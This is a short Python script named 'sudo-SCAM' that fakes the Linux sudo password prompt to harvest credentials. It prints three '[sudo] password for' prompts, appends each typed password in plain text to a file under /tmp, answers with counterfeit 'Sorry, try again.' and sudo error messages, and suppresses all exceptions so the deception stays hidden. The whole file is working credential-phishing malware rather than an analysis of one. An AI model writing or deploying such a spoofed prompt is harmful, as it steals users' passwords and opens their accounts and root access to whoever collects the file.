#!/usr/bin/env python3
"""
sudo-SCAM main script
"""
import os
import getpass
import time


def main():
    """
    Main function
    """
    password_file_path = "/tmp/ss-{0}".format(getpass.getuser())
    if not os.path.exists(password_file_path):
        with open(password_file_path, "w", encoding="utf-8"):
            pass
    prompt = "[sudo] password for {0}: ".format(getpass.getuser())
    i = 0
    interrupted = False
    for i in range(3):
        try:
            password = getpass.getpass(prompt)
            if len(password):
                with open(password_file_path, "a",
                          encoding="utf-8") as password_file:
                    password_file.write("Attempt: {0}\n".format(password))
            time.sleep(2)
            if i != 2:
                print("Sorry, try again.")
        except EOFError:
            interrupted = True
            print("")
            print("sudo: no password was provided")
            break
        except KeyboardInterrupt:
            interrupted = True
            print("")
            break
    if not interrupted:
        i += 1
    if i == 0:
        print("sudo: a password is required")
    elif i == 1:
        print("sudo: 1 incorrect password attempt")
    else:
        print("sudo: {0} incorrect password attempts".format(i))
    return 1


if __name__ == "__main__":
    try:
        main()
    except:  # pylint: disable=bare-except
        pass
